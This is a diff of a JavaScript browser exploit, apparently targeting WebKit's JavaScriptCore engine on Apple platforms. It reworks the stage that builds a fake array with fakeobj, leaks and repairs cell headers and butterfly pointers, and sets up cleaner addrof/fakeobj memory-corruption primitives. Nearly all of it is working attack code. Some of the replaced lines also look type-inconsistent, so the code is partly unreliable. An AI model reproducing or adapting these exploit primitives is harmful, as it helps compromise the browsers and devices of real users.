@@ -493,21 +493,21 @@ var VM_PROT_EXECUTE = 0x4
            
             let fakeArr = fakeobj(Add(addr,new Int64(0x10))); //no way around this im forced to use bigint for fakeobj :(
             // subtract off the incref
-            doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
+            doubleArrayCellHeader = Sub(new Int64.fromDouble(fakeArr[0]),new Int64(0x1));
             port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
             // fix broken cell header
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = new Int64(doubleArrayCellHeader).asDouble();
             // grab a real butterfly pointer
-            let doubleArrayButterfly = float2bigint(fakeArr[1]);
+            let doubleArrayButterfly = new Int64.fromDouble(fakeArr[1]);
             // fix other broken cell header
             obj.fakeButterfly = b0;
-            fakeArr[0] = bigint2float(doubleArrayCellHeader);
+            fakeArr[0] = new Int64.fromDouble(doubleArrayCellHeader);
             // fix the broken butterflys and setup cleaner addrof / fakeobj
-            obj.jsCellHeader = bigint2float(unboxDouble(doubleArrayCellHeader));
+            obj.jsCellHeader = new Int64.fromDouble(new Int64(doubleArrayCellHeader).asJSValue());
             obj.fakeButterfly = a1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
             obj.fakeButterfly = b1;
-            fakeArr[1] = bigint2float(doubleArrayButterfly);
+            fakeArr[1] = new Int64(doubleArrayButterfly).asDouble();
             fakeobj = (addr) => {
               a1[0] = new Int64(addr).asDouble();
               return b1[0];
